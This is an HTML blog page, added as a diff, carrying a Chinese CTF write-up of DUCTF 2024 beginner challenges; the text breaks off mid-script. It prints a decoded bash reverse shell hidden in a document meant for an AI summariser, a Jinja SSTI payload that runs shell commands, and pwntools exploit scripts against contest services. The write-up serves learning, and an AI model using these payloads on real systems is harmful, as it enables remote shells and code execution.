@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="所有begginer栏目题目的wp（迫真） 其他单方向的或多或少都有搞不出来的题目，对于彩笔（我）来说能打好beginner的基础就不错了 队伍名：EICS1 分数：1811 points 排名：227th place 队伍成员 LamentXU Jerrythepro123 Dragonkeep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DUCTF 2024 EICS1 beginner wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="所有begginer栏目题目的wp（迫真） 其他单方向的或多或少都有搞不出来的题目，对于彩笔（我）来说能打好beginner的基础就不错了 队伍名：EICS1 分数：1811 points 排名：227th place 队伍成员 LamentXU Jerrythepro123 Dragonkeep">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/08.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18288730/15.png">
+<meta property="article:published_time" content="2024-07-07T10:20:00.000Z">
+<meta property="article:modified_time" content="2024-07-07T10:20:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Forensics">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18288730/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>DUCTF 2024 EICS1 beginner wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&text=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&is_video=false&description=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DUCTF 2024 EICS1 beginner wp&body=Check out this article: https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&name=DUCTF 2024 EICS1 beginner wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&t=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Beginner"><span class="toc-number">1.</span> <span class="toc-text">Beginner</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tldr-please-summarise"><span class="toc-number">1.1.</span> <span class="toc-text">tldr please summarise</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parrot-the-emu"><span class="toc-number">1.2.</span> <span class="toc-text">parrot the emu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sun-Zi%E2%80%99s-Perfect-Math"><span class="toc-number">1.3.</span> <span class="toc-text">Sun Zi’s Perfect Math</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zoo-feedback-form"><span class="toc-number">1.4.</span> <span class="toc-text">zoo feedback form</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shufflebox"><span class="toc-number">1.5.</span> <span class="toc-text">shufflebox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#number-mashing"><span class="toc-number">1.6.</span> <span class="toc-text">number mashing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intercepted-Transmissions"><span class="toc-number">1.7.</span> <span class="toc-text">Intercepted Transmissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vector-overflow"><span class="toc-number">1.8.</span> <span class="toc-text">vector overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yawa"><span class="toc-number">1.9.</span> <span class="toc-text">yawa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#discord"><span class="toc-number">1.10.</span> <span class="toc-text">discord</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#survey"><span class="toc-number">1.11.</span> <span class="toc-text">survey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#co2"><span class="toc-number">1.12.</span> <span class="toc-text">co2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby%E2%80%99s-First-Forensics"><span class="toc-number">1.13.</span> <span class="toc-text">Baby’s First Forensics</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-I-AM"><span class="toc-number">1.14.</span> <span class="toc-text">SAM I AM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#offtheramp"><span class="toc-number">1.15.</span> <span class="toc-text">offtheramp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#badpolicy"><span class="toc-number">1.16.</span> <span class="toc-text">badpolicy</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DUCTF 2024 EICS1 beginner wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-07T10:20:00.000Z" class="dt-published" itemprop="datePublished">2024-07-07</time>
+        
+        (Updated: <time datetime="2024-07-07T10:20:00.000Z" class="dt-updated" itemprop="dateModified">2024-07-07</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Forensics/" rel="tag">Forensics</a>, <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>所有begginer栏目题目的wp（迫真）</p>
+<p>其他单方向的或多或少都有搞不出来的题目，对于彩笔（我）来说能打好beginner的基础就不错了</p>
+<p>队伍名：EICS1<br>分数：1811 points<br>排名：227th place</p>
+<table>
+<thead>
+<tr>
+<th>队伍成员</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LamentXU</td>
+</tr>
+<tr>
+<td>Jerrythepro123</td>
+</tr>
+<tr>
+<td>Dragonkeep</td>
+</tr>
+<tr>
+<td>6s6</td>
+</tr>
+<tr>
+<td>sanmu</td>
+</tr>
+<tr>
+<td>Aly1xbot</td>
+</tr>
+<tr>
+<td>ftps3rver</td>
+</tr>
+</tbody></table>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">Beginner</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">tldr please summarise</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">parrot the emu</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">Sun Zi’s Perfect Math</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">zoo feedback form</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">shufflebox</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.6">number mashing</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.7">Intercepted Transmission</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.8">vector overflow</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.9">yawa</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.10">discord</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.11">survey</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.12">co2</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.13">Baby’s First Forensics</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.14">SAM I AM</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.15">offtheramp</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.16">badpolicy</a></li>
+</ul>
+<h1 id="Beginner"><a href="#Beginner" class="headerlink" title="Beginner"></a>Beginner</h1><h2 id="tldr-please-summarise"><a href="#tldr-please-summarise" class="headerlink" title="tldr please summarise"></a>tldr please summarise</h2><p>下载，发现文档中有隐写</p>
+<p><img src="/images/migrated/18288730/01.png"></p>
+<p>拖入记事本中</p>
+<p><img src="/images/migrated/18288730/02.png"></p>
+<p>访问网站<a target="_blank" rel="noopener" href="https://pastebin.com/raw/ysYcKmbu">https://pastebin.com/raw/ysYcKmbu</a></p>
+<p><img src="/images/migrated/18288730/03.png"></p>
+<p>base64解密得：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;261.263.263.267&#x2F;DUCTF{chatgpt_I_n33d_2_3scap3} 0&gt;&amp;1</p>
+<p><strong>DUCTF{chatgpt_I_n33d_2_3scap3}</strong></p>
+<h2 id="parrot-the-emu"><a href="#parrot-the-emu" class="headerlink" title="parrot the emu"></a>parrot the emu</h2><p>下载附件，审计代码</p>
+<p><img src="/images/migrated/18288730/04.png"></p>
+<p>一眼ssti，甚至无过滤</p>
+<p>poc一下：</p>
+<p><img src="/images/migrated/18288730/05.png"></p>
+<p>成立，直接getflag</p>
+<blockquote>
+<p>payload: {{‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[133].<strong>init</strong>.<strong>globals</strong>[‘<strong>builtins</strong>‘][‘eval’](“<strong>import</strong>(‘os’).popen(‘cat flag’).read()”)}}</p>
+</blockquote>
+<p><img src="/images/migrated/18288730/06.png"></p>
+<p><strong>DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}</strong></p>
+<h2 id="Sun-Zi’s-Perfect-Math"><a href="#Sun-Zi’s-Perfect-Math" class="headerlink" title="Sun Zi’s Perfect Math"></a>Sun Zi’s Perfect Math</h2><p>老外的比赛里看到中国文化，泪目了</p>
+<p>第一关大致说的就是孙子有1000-1100个兵，设为x</p>
+<p>满足</p>
+<p>x≡2(mod3)<br>x≡4(mod5)<br>x≡5(mod7)</p>
+<p>直接上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1000, 1100):</span><br><span class="line">    if i % 3 == 2 and i % 5 == 4 and i % 7 == 5:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<p>输出1034，输入answer进入下一关</p>
+<p>一眼中国剩余定理</p>
+<p>上脚本一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2, binascii</span><br><span class="line">e = 3</span><br><span class="line">c1 = 105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637</span><br><span class="line">c2 = 31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737</span><br><span class="line">c3 = 64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659</span><br><span class="line">n1 = 147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693</span><br><span class="line">n2 = 95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403</span><br><span class="line">n3 = 95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817</span><br><span class="line">M = n1*n2*n3</span><br><span class="line">m1 = M//n1</span><br><span class="line">m2 = M//n2</span><br><span class="line">m0 = M//n3</span><br><span class="line">t1 = c1*m1*gmpy2.invert(m1,n1)</span><br><span class="line">t2 = c2*m2*gmpy2.invert(m2,n2)</span><br><span class="line">t0 = c3*m0*gmpy2.invert(m0,n3)</span><br><span class="line">x = (t1+t2+t0) % M</span><br><span class="line">m=gmpy2.iroot(x,e)[0]</span><br><span class="line">print(m)</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>
+
+<p><strong>DUCTF{btw_y0u_c4n_als0_us3_CRT_f0r_p4rt14l_fr4ct10ns}</strong></p>
+<h2 id="zoo-feedback-form"><a href="#zoo-feedback-form" class="headerlink" title="zoo feedback form"></a>zoo feedback form</h2><p>下载代码，审计</p>
+<p><img src="/images/migrated/18288730/07.png"></p>
+<p>一眼xxe</p>
+<p>抓包，改数据包为标准的xxe漏洞利用payload即可</p>
+<p><img src="/images/migrated/18288730/08.jpg"></p>
+<p><strong>DUCTF{emU_say$_he!!o_ho!@_ci@0}</strong></p>
+<h2 id="shufflebox"><a href="#shufflebox" class="headerlink" title="shufflebox"></a>shufflebox</h2><p>下载开始源码，分析后发现就是一个乱序加密</p>
+<p>与这题差不多: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18250981">https://www.cnblogs.com/LAMENTXU/articles/18250981</a></p>
+<p>直接对着两个字符串瞪出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaaabbbbccccdddd -&gt; ccaccdabdbdbbada</span><br><span class="line">abcdabcdabcdabcd -&gt; bcaadbdcdbcdacab</span><br><span class="line">???????????????? -&gt; owuwspdgrtejiiud</span><br></pre></td></tr></table></figure>
+
+<p>过程就是，从第一个字符串已知加密后第一个字符为c，而c只在第一个字符串的9-12位出现，对照第二个字符串中加密后的第一个字符为b，而b只在加密前的第2，6，10，14位出现，此处只有10属于9-12</p>
+<p>由此可得：加密时，第10个字符会被移动到第1位，即：?????????o?????? -&gt; owuwspdgrtejiiud</p>
+<p>以此类推解出flag</p>
+<p><strong>DUCTF{udiditgjwowsuper}</strong></p>
+<h2 id="number-mashing"><a href="#number-mashing" class="headerlink" title="number mashing"></a>number mashing</h2><p>无壳，64位，IDA启动！</p>
+<p><img src="/images/migrated/18288730/09.png"></p>
+<p>审计得，核心逻辑为输入两个数字，他们不为0，v5不等于1，且v4&#x2F;v5等于v4</p>
+<p>由于int得取值范围是[-2^32, 2^32-1]那么2147483647刚好为最大的int，可得2147483648&#x2F;-1&#x3D;-2147483648此数字为合法的int</p>
+<p>然后就有一个无法解释的诡异现象，即2147483648&#x3D;-2147483648（结果溢出）</p>
+<p>想知道原因的可以去：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42779370/article/details/102829210">https://blog.csdn.net/weixin_42779370&#x2F;article&#x2F;details&#x2F;102829210</a></p>
+<p>得: v4&#x3D;2147483648; v5&#x3D;-1</p>
+<p><img src="/images/migrated/18288730/10.png"></p>
+<p><strong>DUCTF{w0w_y0u_just_br0ke_math!!}</strong>(笑)</p>
+<h2 id="Intercepted-Transmissions"><a href="#Intercepted-Transmissions" class="headerlink" title="Intercepted Transmissions"></a>Intercepted Transmissions</h2><p><img src="/images/migrated/18288730/11.png"></p>
+<p>可得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ccir_476_dict = &#123;</span><br><span class="line">    &#x27;1000111&#x27;: &#x27;A&#x27;, &#x27;1110010&#x27;: &#x27;B&#x27;, &#x27;0011101&#x27;: &#x27;C&#x27;, &#x27;1010011&#x27;: &#x27;D&#x27;, </span><br><span class="line">    &#x27;1010110&#x27;: &#x27;E&#x27;, &#x27;0011011&#x27;: &#x27;F&#x27;, &#x27;0110101&#x27;: &#x27;G&#x27;, &#x27;1101001&#x27;: &#x27;H&#x27;, </span><br><span class="line">    &#x27;1001101&#x27;: &#x27;I&#x27;, &#x27;0010111&#x27;: &#x27;J&#x27;, &#x27;0011110&#x27;: &#x27;K&#x27;, &#x27;1100101&#x27;: &#x27;L&#x27;, </span><br><span class="line">    &#x27;0111001&#x27;: &#x27;M&#x27;, &#x27;1011001&#x27;: &#x27;N&#x27;, &#x27;1110001&#x27;: &#x27;O&#x27;, &#x27;0101101&#x27;: &#x27;P&#x27;, </span><br><span class="line">    &#x27;0101110&#x27;: &#x27;Q&#x27;, &#x27;1010101&#x27;: &#x27;R&#x27;, &#x27;1001011&#x27;: &#x27;S&#x27;, &#x27;1110100&#x27;: &#x27;T&#x27;, </span><br><span class="line">    &#x27;1001110&#x27;: &#x27;U&#x27;, &#x27;0111100&#x27;: &#x27;V&#x27;, &#x27;0100111&#x27;: &#x27;W&#x27;, &#x27;0111010&#x27;: &#x27;X&#x27;, </span><br><span class="line">    &#x27;0101011&#x27;: &#x27;Y&#x27;, &#x27;1100011&#x27;: &#x27;Z&#x27;, &#x27;1111000&#x27;: &#x27;&lt;CR&gt;&#x27;, &#x27;1101100&#x27;: &#x27;&lt;LF&gt;&#x27;,</span><br><span class="line">    &#x27;1011010&#x27;: &#x27;&lt;LTRS&gt;&#x27;, &#x27;0110110&#x27;: &#x27;&lt;FIGS&gt;&#x27;, &#x27;1011100&#x27;: &#x27; &#x27;,&#x27;1101010&#x27;:&#x27;&lt;BL&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 给定的二进制字符串</span><br><span class="line">binary_string = &quot;101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011&quot;</span><br><span class="line"></span><br><span class="line"># 将二进制字符串分割为7位的块</span><br><span class="line">blocks = [binary_string[i:i+7] for i in range(0, len(binary_string), 7)]</span><br><span class="line">print(blocks)</span><br><span class="line"># 查找每个块的对应字符</span><br><span class="line">decoded_chars = [ccir_476_dict.get(block, &#x27;?&#x27;) for block in blocks]</span><br><span class="line"></span><br><span class="line"># 输出解密后的字符串</span><br><span class="line">decoded_string = &#x27;&#x27;.join(decoded_chars)</span><br><span class="line">print(&quot;Decoded string:&quot;, decoded_string)</span><br></pre></td></tr></table></figure>
+
+<p>输出：HHTHE QUPKKRSS ARE HELD QN FRCQLITY HQQOQQF</p>
+<p>对照表格解码即可，此处注意意为切换到图中得CHARACTER CASE；意为切换到FIGURE CASE</p>
+<p><strong>DUCTF{##TH3 QU0KK4BELLS AR3 H3LD 1N F4C1LITY #11911!}</strong></p>
+<h2 id="vector-overflow"><a href="#vector-overflow" class="headerlink" title="vector overflow"></a>vector overflow</h2><p>找vector地址(DUCTFAAAAAAAAAAA)，再加p64（vector地址）即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *             </span><br><span class="line">address=&#x27;2024.ductf.dev&#x27;</span><br><span class="line">port=&#x27;30013&#x27;</span><br><span class="line"></span><br><span class="line">p=remote(address,port) #laczenie online</span><br><span class="line"></span><br><span class="line">PATTERN=10*b&#x27;A&#x27;</span><br><span class="line">v_start=0x4051e0</span><br><span class="line">v_end=v_start+5</span><br><span class="line">payload = b&quot;DUCTF\x00&quot;+PATTERN+p64(v_start)+p64(v_end)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>DUCTF{y0u_pwn3d_th4t_vect0r!!}</strong></p>
+<h2 id="yawa"><a href="#yawa" class="headerlink" title="yawa"></a>yawa</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=remote(&quot;2024.ductf.dev&quot;, 30010)</span><br><span class="line">#io=process(&quot;./real&quot;)</span><br><span class="line">def name(name):</span><br><span class="line">        io.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">        io.sendline(&quot;1&quot;)</span><br><span class="line">        io.sendline(name)</span><br><span class="line"></span><br><span class="line">def hello():</span><br><span class="line">        io.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">        io.sendline(&quot;2&quot;)</span><br><span class="line">        print io.recvuntil(&quot;P&quot;*7)</span><br><span class="line">        #return u64(io.recv(8))</span><br><span class="line"></span><br><span 